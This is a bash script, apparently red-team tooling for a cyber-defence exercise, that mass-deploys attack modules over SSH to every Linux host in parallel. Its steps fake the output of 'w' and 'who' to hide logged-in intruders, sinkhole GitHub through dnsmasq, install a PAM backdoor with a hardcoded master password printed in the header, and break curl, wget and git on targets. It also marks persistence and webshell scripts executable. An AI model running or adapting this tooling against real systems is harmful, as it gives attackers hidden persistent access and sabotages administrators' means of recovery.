#!/usr/bin/env bash
# let-the-madness-begin.sh
#
# 1. Pull latest tooling from GitHub
# 2. Mass-deploy to all Linux hosts in parallel:
#      - compromise-who   (fake w + who output)
#      - sinkhole         (dnsmasq GitHub sinkhole — fast)
#      - pam-backdoor     (auth as any user with rt2025!delta)
#      - break-net-tools  (breaks curl, wget, git on targets)
#
# Usage:
#   ./let-the-madness-begin.sh [OPTIONS]
#
# Auth options (pick one):
#   -i, --identity FILE   SSH private key (preferred)
#   -p, --pass PASS       SSH password
#
# Other:
#   -u, --user USER       SSH username (default: root)
#   -P, --port PORT       SSH port (default: 22)
#       --no-sudo         Don't use sudo (default when user is root)
#   -j, --jobs N          Parallel jobs per wave (default: 9)
#       --dry-run         Preview commands without running
#   -h, --help            Show this help

set -euo pipefail

RT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(dirname "$RT_DIR")"
REPO_URL="git@github.com:scp603/cdtrt2.git"
MASS="${RT_DIR}/mass-deploy.sh"

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
BOLD='\033[1m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()  { echo -e "\n${CYAN}${BOLD}━━  $*  ━━${NC}\n"; }

# ── defaults ──────────────────────────────────────────────────────────────────
SSH_USER="root"
SSH_KEY=""
SSH_PASS=""
SSH_PORT="22"
NO_SUDO=1      # default on: if you're SSHing as root you don't need sudo
MAX_JOBS=9
DRY_RUN=0
EXTRA_OPTS=()

usage() {
    sed -n '/^# Usage:/,/^[^#]/{/^#/{s/^# \?//;p};/^[^#]/q}' "$0"
    exit "${1:-0}"
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -u|--user)      SSH_USER="$2"; shift 2 ;;
        -i|--identity)  SSH_KEY="$2";  shift 2 ;;
        -p|--pass)      SSH_PASS="$2"; shift 2 ;;
        -P|--port)      SSH_PORT="$2"; shift 2 ;;
        --no-sudo)      NO_SUDO=1;     shift   ;;
        -j|--jobs)      MAX_JOBS="$2"; shift 2 ;;
        --dry-run)      DRY_RUN=1;     shift   ;;
        -h|--help)      usage 0                ;;
        *) err "Unknown option: $1"; usage 1   ;;
    esac
done

# build shared mass-deploy auth flags
[[ -n "$SSH_KEY"  ]] && EXTRA_OPTS+=(-i "$SSH_KEY")
[[ -n "$SSH_PASS" ]] && EXTRA_OPTS+=(-p "$SSH_PASS")
[[ -n "$SSH_PORT" ]] && EXTRA_OPTS+=(-P "$SSH_PORT")
[[ $NO_SUDO -eq 1 ]] && EXTRA_OPTS+=(--no-sudo)
[[ $DRY_RUN -eq 1 ]] && EXTRA_OPTS+=(--dry-run)

md() {
    "$MASS" -u "$SSH_USER" -j "$MAX_JOBS" "${EXTRA_OPTS[@]}" "$@"
}

# ── banner ────────────────────────────────────────────────────────────────────
echo -e "${RED}${BOLD}"
cat << 'EOF'
 __      _____         _      _                                 
 \ \    / ____|       | |    | |                                
  \ \  | (___   ___   | | ___| |_                               
   > >  \___ \ / _ \  | |/ _ \ __|                              
  / /   ____) | (_) | | |  __/ |_                               
 /_/   |_____/ \___/  |_|\___|\__|        _                     
 \ \   | | | |          |  \/  |         | |                    
  \ \  | |_| |__   ___  | \  / | __ _  __| |_ __   ___  ___ ___ 
   > > | __| '_ \ / _ \ | |\/| |/ _` |/ _` | '_ \ / _ \/ __/ __|
  / /  | |_| | | |  __/ | |  | | (_| | (_| | | | |  __/\__ \__ \
 /_/    \__|_| |_|\___| |_|  |_|\__,_|\__,_|_| |_|\___||___/___/
 \ \   |  _ \           (_)                                     
  \ \  | |_) | ___  __ _ _ _ __                                 
   > > |  _ < / _ \/ _` | | '_ \                                
  / /  | |_) |  __/ (_| | | | | |                               
 /_/   |____/ \___|\__, |_|_| |_|                               
                    __/ |                                       
                   |___/                                        
EOF
echo -e "${NC}"

# ── step 1: pull latest tooling ───────────────────────────────────────────────
hdr "Step 1/5 — Pulling latest tooling"

if [[ -d "$REPO_DIR/.git" ]]; then
    info "Repo exists at ${REPO_DIR} — pulling latest"
    git -C "$REPO_DIR" pull --ff-only
else
    info "Cloning ${REPO_URL} → ${REPO_DIR}"
    git clone "$REPO_URL" "$REPO_DIR"
fi

chmod +x "${RT_DIR}"/*.sh "${RT_DIR}"/evil-timer/*.sh \
         "${RT_DIR}"/pam-backdoor/*.sh "${RT_DIR}"/persist/*.sh \
         "${RT_DIR}"/webshells/*.sh 2>/dev/null || true

# ── step 2: compromise w + who ────────────────────────────────────────────────
hdr "Step 2/5 — Faking w + who"
info "Deploying compromise-who to all Linux hosts…"
md compromise-who install

# ── step 3: github sinkhole ───────────────────────────────────────────────────
hdr "Step 3/5 — GitHub dnsmasq sinkhole"
info "Deploying sinkhole (dnsmasq, fast) to all Linux hosts…"
md sinkhole install

# ── step 4: PAM backdoor ─────────────────────────────────────────────────────
hdr "Step 4/5 — PAM backdoor"
info "Deploying pam-backdoor to all Linux hosts…"
md pam-backdoor install

# ── step 5: break net tools ───────────────────────────────────────────────────
hdr "Step 5/5 — Breaking curl, wget, git"
info "Deploying break-net-tools to all Linux hosts…"
md break-net-tools install

# ── done ──────────────────────────────────────────────────────────────────────
echo
echo -e "${GREEN}${BOLD}  All waves complete. Madness achieved.${NC}"
echo
